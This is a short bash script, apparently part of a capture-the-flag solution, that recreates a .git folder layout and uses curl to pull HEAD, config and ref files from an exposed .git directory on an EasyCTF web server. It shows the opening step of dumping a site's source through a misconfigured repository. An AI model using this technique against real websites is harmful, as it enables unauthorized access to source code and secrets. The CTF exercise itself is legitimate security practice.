#!/bin/bash

# Curls the generic files within a .git folder for structure
mkdir -p .git/
cd .git/;
mkdir -p {hooks,info,objects/{info,pack},refs/{heads,tags}};
for file in HEAD config description info/exclude refs/heads/master; do
    curl "http://edge2.web.easyctf.com/.git/${file}" > "${file}";
done;
cd ..;
